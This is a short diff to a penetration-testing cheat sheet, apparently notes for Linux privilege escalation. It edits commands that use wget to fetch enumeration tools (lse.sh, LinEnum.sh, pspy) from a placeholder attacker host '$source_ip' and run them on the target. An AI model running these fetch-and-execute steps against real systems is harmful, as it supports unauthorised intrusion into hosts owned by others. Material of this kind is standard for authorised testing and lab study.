@@ -3,7 +3,7 @@
 
 ## Enumeration Scripts
 ```
-wget http://$source_ip/tools_linux/lse.sh; bash lse.sh | tee lse.sh.out
+wget http://$source_ip/tools_linux/lse.sh; bash lse.sh -l 1 | tee lse.sh.out
 ```
 ```
 wget http://$source_ip/tools_linux/LinEnum.sh; bash LinEnum.sh | tee LinEnum.sh.out
@@ -32,10 +32,10 @@ wget http://$source_ip/tools_linux/checksec; bash checksec --fortify-proc=1 | te
 
 ## Process monitoring
 ```
-wget http://$source_ip/tools_linux/pspy32; pspy32
+wget http://$source_ip/tools_linux/pspy32; chmod +x pspy32; ./pspy32
 ```
 ```
-wget http://$source_ip/tools_linux/pspy64; pspy64
+wget http://$source_ip/tools_linux/pspy64; chmod +x pspy64; ./pspy64
 ```
 
 ## Exploit Suggesters
